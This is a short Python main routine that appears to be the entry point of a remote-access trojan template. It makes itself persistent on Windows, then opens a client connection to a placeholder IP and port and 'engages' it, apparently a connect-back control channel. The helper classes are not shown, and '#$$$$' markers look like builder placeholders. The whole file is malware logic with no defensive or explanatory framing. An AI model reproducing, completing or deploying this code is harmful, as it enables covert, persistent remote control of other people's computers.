
def main():
    pers = PERSISTENCE()
    pers.become_persistent_on_windows()
    #$$$$

    #$$$$
    client = CLIENT(CONSTIP, CONSTPT)
    client.engage()

if __name__ == "__main__":
    main()